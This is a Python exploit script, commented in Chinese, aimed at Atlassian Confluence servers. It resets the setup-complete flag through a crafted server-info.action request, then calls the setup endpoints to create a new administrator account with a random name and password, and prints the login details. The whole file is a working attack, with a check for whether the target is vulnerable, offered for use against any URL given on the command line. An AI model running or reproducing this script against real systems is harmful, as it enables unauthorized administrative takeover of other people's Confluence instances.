import requests
import warnings
import urllib3
import argparse
import random
import string

# 异常忽略
urllib3.disable_warnings()
warnings.filterwarnings("ignore")

parser = argparse.ArgumentParser()
parser.add_argument('-url', type=str, default=None, help="目标url如：http://xx.xx.xx.xx")
args = parser.parse_args()

url = args.url

proxy = '127.0.0.1:8080'

proxies = {
    'http': 'http://' + proxy,
    'https': 'https://' + proxy
}

# 添加请求头
headers = {
    'X-Atlassian-Token': 'no-check',
    'Content-Type': 'application/x-www-form-urlencoded'
}

headers2 = {
    'X-Atlassian-Token': 'no-check',
}

response = requests.get(url + "/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false",
                        verify=False)

str = response.text

if not str.__contains__("success"):
    print("当前url不存在漏洞：" + url)
    exit()

# 生成随机用户名和密码
random_username = ''.join(random.choices(string.ascii_lowercase, k=8))
random_password = ''.join(random.choices(string.ascii_letters + string.digits, k=12))

d = "username=" + random_username + "&fullName=" + random_username + "&email=" + random_username + "%40localhost&password=" + random_password + "&confirm=" + random_password + "&setup-next-button=Next"

requests.post(url=url + "/setup/setupadministrator.action", headers=headers, data=d,
              cookies=response.cookies,
              verify=False)

requests.post(url + "/setup/finishsetup.action", headers=headers2, cookies=response.cookies, verify=False)
print("添加成功")
print("用户名：" + random_username)
print("密码：" + random_password)
